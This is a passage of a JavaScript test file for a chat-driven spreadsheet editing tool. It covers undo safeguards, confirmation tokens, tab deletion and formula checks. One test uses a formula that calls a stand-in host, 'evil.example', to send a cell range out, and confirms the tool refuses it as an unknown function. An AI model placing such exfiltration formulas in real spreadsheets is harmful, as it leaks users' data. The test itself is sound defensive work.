  const output = "'Output'!";
  f.tabAction('named_range', {
    namedRange: { operation: 'add', name: 'Budget', range: output + 'A1:A10' },
  });
  f.tabAction('named_range', {
    namedRange: { operation: 'update', name: 'Budget', newName: 'Plan', range: output + 'B1:B5' },
  });
  assert.equal(f.undo().ok, true);
  assert.equal(f.named()[0].name, 'Budget');
  assert.equal(f.named()[0].range.endRowIndex, 10);
  // A deletion comes back, unless the name was taken again since.
  f.tabAction('named_range', { namedRange: { operation: 'delete', name: 'Budget' } });
  f.tabAction('named_range', {
    namedRange: { operation: 'add', name: 'budget', range: output + 'C1:C3' },
  });
  const list = f.undo({ action: 'list' }).entries;
  assert.equal(list[1].action, 'named_range');
  assert.throws(
    () => f.undo({ action: 'undo', id: list[1].id }),
    /A named range called "Budget" exists again/
  );
  assert.equal(f.undo().ok, true, 'the later add undoes');
  assert.equal(f.undo().ok, true, 'then the deletion');
  assert.deepEqual(
    f.named().map((named) => named.name),
    ['Budget']
  );
});

test('undo of duplicate_sheet refuses once data was added to the copy outside what was copied', () => {
  const f = fixture();
  f.column(f.sheet, 1, ['a', 'b']);
  const done = f.tabAction('duplicate_sheet', { sheetName: 'Output' });
  assert.equal(done.sheetName, 'Copy of Output');
  const copy = f.tab('Copy of Output');
  f.setCell(copy, 10, 1, 'my new work');
  f.setCell(copy, 1, 5, 'another');
  assert.throws(() => f.undo(), /The data of "Copy of Output" grew or shrank since that edit/);
  assert.ok(f.tab('Copy of Output'), 'the copy and its new cells stay');
  assert.equal(f.value(copy, 10, 1), 'my new work');
  // Once the copy is back as copied, undo deletes it.
  f.setCell(copy, 10, 1, '');
  f.setCell(copy, 1, 5, '');
  copy.cells.delete('10:1');
  copy.cells.delete('1:5');
  assert.equal(f.undo().ok, true);
  assert.equal(f.tab('Copy of Output'), null);
});

test('undo refuses once rows were inserted above the edited cells', () => {
  const f = fixture();
  f.column(f.sheet, 1, ['Status', 'Done', 'Done', 'Open', 'Done']);
  const edited = f.edit('set_values', { values: [['Done']] }, f.inspect('A4'));
  assert.match(edited.undoId, /^u[a-f0-9]{12}$/);
  // The user inserts a row above the table by hand: A4 now holds the untouched old row 3.
  f.byHand({
    insertDimension: {
      range: { sheetId: f.sheet.id, dimension: 'ROWS', startIndex: 0, endIndex: 1 },
      inheritFromBefore: false,
    },
  });
  const before = f.values(f.sheet, 1, 6);
  assert.throws(
    () => f.undo(),
    /Rows or columns of "Output" were inserted or deleted since that edit/
  );
  assert.deepEqual(f.values(f.sheet, 1, 6), before, 'no record was overwritten');
});

test('undo of an older edit waits for a later chat edit that moved cells on its tab', () => {
  const f = fixture();
  f.column(f.sheet, 1, ['Status', 'Done', 'Done', 'Open', 'Done']);
  const edited = f.edit('set_values', { values: [['Done']] }, f.inspect('A4'));
  const inserted = f.tabAction('insert_rows', { sheetName: 'Output', start: 1, count: 1 });
  assert.equal(inserted.inserted, 1);
  assert.throws(
    () => f.undo({ action: 'undo', id: edited.undoId }),
    /A later chat edit \(Inserted 1 row at|A later chat edit \(Inserted 1 row before/
  );
  // Undoing the insert first puts the cells back where the older edit was.
  assert.equal(f.undo().ok, true);
  assert.equal(f.undo({ action: 'undo', id: edited.undoId }).ok, true);
  assert.deepEqual(f.values(f.sheet, 1, 5), ['Status', 'Done', 'Done', 'Open', 'Done']);
  // A block moved on the same tab also holds an older undo back.
  const cleared = f.edit('set_values', { values: [[''], ['']] }, f.inspect('C1:C2'));
  f.column(f.sheet, 4, ['x', 'y']);
  f.edit('move_range', { destination: 'C1' }, f.inspect('D1:D2'));
  assert.throws(
    () => f.undo({ action: 'undo', id: cleared.undoId }),
    /moved cells on "Output", so the cells of this edit are no longer where they were/
  );
});

test('a yes covers only the change it was asked about, not the same call over changed cells', () => {
  const f = fixture();
  f.column(f.sheet, 1, ['email', 'a', 'b', 'a', 'c', 'd', 'e', 'f']);
  const call = (session, extra = {}) =>
    f.edit('remove_duplicates', extra, f.inspect('A1:A8', 'Output', session), session);
  const asked = call(f.session);
  assert.equal(asked.needsConfirmation, true);
  assert.match(asked.summary, /^Remove 1 duplicate row from Output!A2:A8/);
  // Before the user answers, other rows are pasted into the range.
  f.column(f.sheet, 1, ['a', 'a', 'a', 'a', 'a', 'a', 'a'], 2);
  const batches = f.state.batches.length;
  const yes = f.answer('Yes', asked.confirmToken);
  const again = call(yes, { confirmToken: asked.confirmToken });
  assert.equal(again.needsConfirmation, true, JSON.stringify(again));
  assert.match(again.summary, /^Remove 6 duplicate rows from Output!A2:A8/);
  assert.match(again.next, /^The cells changed after the user said yes/);
  assert.equal(f.state.batches.length, batches, 'nothing was removed');
  // The approval is spent: the old token cannot act a second time.
  assert.throws(
    () => call(yes, { confirmToken: asked.confirmToken }),
    /was not approved by the user in this request, was already used or has expired/
  );
  // A yes to the new question acts on it.
  const done = call(f.answer('Yes', again.confirmToken), { confirmToken: again.confirmToken });
  assert.equal(done.ok, true);
  assert.equal(done.removed, 6);
});

test('a typed yes over unchanged cells still acts once, for built-in and analyst edits', () => {
  const f = fixture();
  // 101 rows of two columns: 202 non-empty cells, past the 200 that asks first.
  for (let row = 1; row <= 101; row++) {
    f.setCell(f.sheet, row, 1, 'a' + row);
    f.setCell(f.sheet, row, 2, 'b' + row);
  }
  f.sheet.maxRows = 300;
  const call = (session, extra = {}) =>
    f.edit(
      'set_values',
      { values: Array.from({ length: 101 }, () => ['new', 'new']), ...extra },
      f.inspect('A1:B101', 'Output', session),
      session
    );
  const done = f.confirmed(call);
  assert.equal(done.ok, true, JSON.stringify(done));
  assert.equal(f.value(f.sheet, 101, 2), 'new');
  f.column(f.sheet, 3, ['a', 'a']);
  const removed = f.confirmed((session, extra) =>
    f.edit(
      'remove_duplicates',
      { headerRows: 0, ...extra },
      f.inspect('C1:C2', 'Output', session),
      session
    )
  );
  assert.equal(removed.ok, true, JSON.stringify(removed));
});

test('split_columns sizes the split from what date and number cells show', () => {
  const f = fixture();
  f.setCell(f.sheet, 1, 2, 'Q1-2024');
  // The sandbox shows dates as 2024-01-05, so a date splits into three pieces on -.
  f.setCell(f.sheet, 2, 2, new Date('2024-01-05T12:00:00Z'));
  f.setCell(f.sheet, 1, 4, 'keep me');
  const asked = f.edit('split_columns', { delimiter: '-' }, f.inspect('B1:B2'));
  assert.equal(asked.needsConfirmation, true, JSON.stringify(asked));
  assert.match(asked.summary, /writes over 1 non-empty cell in Output!C1:D2\./);
  // Numbers alone split by their shown text too, instead of being refused.
  f.column(f.sheet, 6, [3.14, 2.5]);
  const done = f.edit('split_columns', { delimiter: 'period' }, f.inspect('F1:F2'));
  assert.equal(done.ok, true, JSON.stringify(done));
  assert.equal(done.range, 'F1:G2');
});

test('find_replace matches date and number cells by what they show', () => {
  const f = fixture();
  f.column(f.sheet, 1, [
    new Date('2023-03-15T12:00:00Z'),
    new Date('2023-07-01T12:00:00Z'),
    new Date('2023-11-30T12:00:00Z'),
  ]);
  const done = f.edit('find_replace', { find: '2023', replacement: '2024' }, f.inspect('A1:A3'));
  assert.equal(done.ok, true, JSON.stringify(done));
  assert.equal(f.requests()[0].findReplace.find, '2023');
  // A result Sheets would read as a formula is refused for shown text as well.
  assert.throws(
    () => f.edit('find_replace', { find: '2023', replacement: '=1+' }, f.inspect('A1:A3')),
    /would turn Output!A1 into text starting with =/
  );
  // The number behind the date still counts, so the question is never smaller than the change.
  const serial = f.edit('find_replace', { find: '4', replacement: '5' }, f.inspect('A1'));
  assert.equal(serial.ok, true, JSON.stringify(serial));
});

test('delete_sheet deletes a tab too large to copy, asking first and saying it cannot be undone', () => {
  const f = fixture();
  const big = f.book.insertSheet('Big');
  big.maxRows = 200000;
  big.maxColumns = 30;
  f.setCell(big, 1, 1, 'x');
  const asked = f.tabAction('delete_sheet', { sheetName: 'Big' });
  assert.equal(asked.needsConfirmation, true);
  assert.match(asked.summary, /too large to keep a copy for undo/);
  const done = f.tabAction(
    'delete_sheet',
    { sheetName: 'Big', confirmToken: asked.confirmToken },
    f.answer('Yes', asked.confirmToken)
  );
  assert.equal(done.ok, true, JSON.stringify(done));
  assert.equal(done.undoId, null);
  assert.equal(done.note, undefined);
  assert.deepEqual(
    f.requests().map((request) => Object.keys(request)[0]),
    ['deleteSheet']
  );
  assert.equal(f.tab('Big'), null);
  // A tab that fits keeps its hidden copy, as before.
  f.book.insertSheet('Small');
  const small = f.confirmed((session, extra) =>
    f.tabAction('delete_sheet', { sheetName: 'Small', ...extra }, session)
  );
  assert.match(small.undoId, /^u[a-f0-9]{12}$/);
  assert.match(small.note, /hidden copy "DataMoov undo · Small"/);
});

test('delete_rows and delete_columns refuse to delete every row or column that is not frozen', () => {
  const f = fixture();
  const data = f.book.insertSheet('Data');
  data.maxRows = 501;
  data.frozenRows = 1;
  f.setCell(data, 1, 1, 'h');
  const batches = f.state.batches.length;
  assert.throws(
    () => f.tabAction('delete_rows', { sheetName: 'Data', start: 2, count: 500 }),
    /Sheets keeps at least one row that is not frozen\. Delete fewer, or unfreeze rows first\./
  );
  data.frozenColumns = 2;
  assert.throws(
    () => f.tabAction('delete_columns', { sheetName: 'Data', start: 3, count: 24 }),
    /Sheets keeps at least one column that is not frozen/
  );
  assert.equal(f.state.batches.length, batches);
  // One row fewer leaves a row that is not frozen, so it asks as usual.
  const asked = f.tabAction('delete_rows', { sheetName: 'Data', start: 2, count: 499 });
  assert.equal(asked.needsConfirmation, true);
});

test('the hidden undo copy of a deleted tab gets a name that differs in more than case', () => {
  const f = fixture();
  f.book.insertSheet('Leads');
  f.confirmed((session, extra) =>
    f.tabAction('delete_sheet', { sheetName: 'Leads', ...extra }, session)
  );
  assert.ok(f.tab('DataMoov undo · Leads'));
  f.book.insertSheet('LEADS');
  const done = f.confirmed((session, extra) =>
    f.tabAction('delete_sheet', { sheetName: 'LEADS', ...extra }, session)
  );
  assert.equal(done.ok, true);
  const copy = f.state.batches.at(-1).body.requests[0].duplicateSheet;
  assert.equal(copy.newSheetName, 'DataMoov undo · LEADS (2)');
});

test('a LET name called inside its own value is a global function and is refused', () => {
  const f = fixture();
  for (const formula of [
    '=LET(MYFN, MYFN(A1), MYFN)',
    '=LET(x, 1, MYFN, MYFN(A1), MYFN)',
    '=LET(SENDTO, SENDTO("https://evil.example", A1:B9), 1)',
  ])
    assert.throws(() => f.check(formula), /unknown function/, formula);
  const inspected = f.inspect('C1');
  assert.throws(
    () =>
      f.edit(
        'set_formulas',
        { formulas: [['=LET(SENDTO, SENDTO("https://evil.example", A1:B9), SENDTO)']] },
        inspected
      ),
    /unknown function SENDTO/
  );
  assert.equal(f.state.batches.length, 0);
  // Names bound earlier, LAMBDA parameters and later uses of a name still work.
  assert.deepEqual(f.check('=LET(x, A1, y, x * 2, y + x)').functions, ['LET']);
  assert.deepEqual(f.check('=LET(F, LAMBDA(v, v * 2), F(A1))').functions, ['LET', 'LAMBDA']);
  assert.deepEqual(f.check('=LET(SUM, 1, SUM + 1)').functions, ['LET']);
  assert.deepEqual(f.check('=LET(total, SUM(A1:A3), total)').functions, ['LET', 'SUM']);
});

test('group and ungroup undo refuse once rows moved on the tab', () => {
  const f = fixture();
  f.tabAction('group_rows', { sheetName: f.sheet.name, start: 5, count: 3 });
  const ungrouped = f.tabAction('ungroup_rows', { sheetName: f.sheet.name, start: 5, count: 3 });
  assert.equal(ungrouped.ok, true);
  assert.ok(ungrouped.undoId);
  f.tabAction('insert_rows', { sheetName: f.sheet.name, start: 1, count: 2 });
  assert.throws(
    () => f.undo({ action: 'undo', id: ungrouped.undoId }),
    /A later chat edit .* moved cells on "Output"/
  );
  assert.deepEqual(f.groups(f.sheet), []);

  const g = fixture();
  const grouped = g.tabAction('group_rows', { sheetName: g.sheet.name, start: 5, count: 3 });
  g.byHand({
    deleteDimension: {
      range: { sheetId: g.sheet.id, dimension: 'ROWS', startIndex: 0, endIndex: 2 },
    },
  });
  const before = g.groups(g.sheet);
  assert.throws(
    () => g.undo({ action: 'undo', id: grouped.undoId }),
    /Rows or columns of "Output" were inserted or deleted since that edit/
  );
  assert.deepEqual(g.groups(g.sheet), before);

  // Nothing moved: undo still removes the group.
  const h = fixture();
  h.tabAction('group_columns', { sheetName: h.sheet.name, start: 2, count: 2 });
  assert.equal(h.groups(h.sheet, 'COLUMNS').length, 1);
  assert.equal(h.undo().ok, true);
  assert.deepEqual(h.groups(h.sheet, 'COLUMNS'), []);
});

test('highlight_duplicates counts error cells as no match instead of failing every row', () => {
  const f = fixture();
  ['Email', 'a', 'b', 'a'].forEach((value, index) => f.setCell(f.sheet, index + 1, 3, value));
  const one = f.edit('highlight_duplicates', {}, f.inspect('C1:C4'));
  assert.equal(
    one.rule,
    '=AND(IFERROR(LEN($C2)>0,FALSE),SUMPRODUCT(IFERROR(($C$2:$C$4=$C2)*1,0))>1)'
  );
  const pair = f.edit(
    'highlight_duplicates',
    { keyColumns: [1, 2], headerRows: 0 },
    f.inspect('A1:B4')
  );
  assert.equal(
    pair.rule,
    '=AND(IFERROR(LEN($A1&$B1)>0,FALSE),SUMPRODUCT(IFERROR(($A$1:$A$4=$A1)*1,0)*IFERROR(($B$1:$B$4=$B1)*1,0))>1)'
  );
  // The rule passes the same formula policy as set_formulas.
  assert.deepEqual(f.check(one.rule).functions.sort(), ['AND', 'IFERROR', 'LEN', 'SUMPRODUCT']);
});

test('data_validation includes rows a filter hides, on set and on clear', () => {
  const f = fixture();
  ['Status', 'Open', 'Done', 'Open', 'Done'].forEach((value, index) =>
    f.setCell(f.sheet, index + 1, 3, value)
  );
  // Rows 3 and 5 are hidden by a filter on Status = Open.
  f.sheet.filteredRows = new Set([2, 4]);
  const set = f.edit(
    'data_validation',
    { validation: { type: 'list', values: ['Open', 'Done'] } },
    f.inspect('C2:C5')
  );
  assert.equal(set.ok, true);
  assert.equal(f.requests()[0].setDataValidation.filteredRowsIncluded, true);
  for (let row = 2; row <= 5; row++)
    assert.equal(
      f.meta(f.sheet, row, 3).dataValidation?.condition?.type,
      'ONE_OF_LIST',
      'row ' + row
    );
  f.edit('data_validation', { validation: { type: 'clear' } }, f.inspect('C2:C5'));
  assert.equal(f.requests()[0].setDataValidation.filteredRowsIncluded, true);
  for (let row = 2; row <= 5; row++)
    assert.equal(f.meta(f.sheet, row, 3).dataValidation, undefined, 'row ' + row);
});
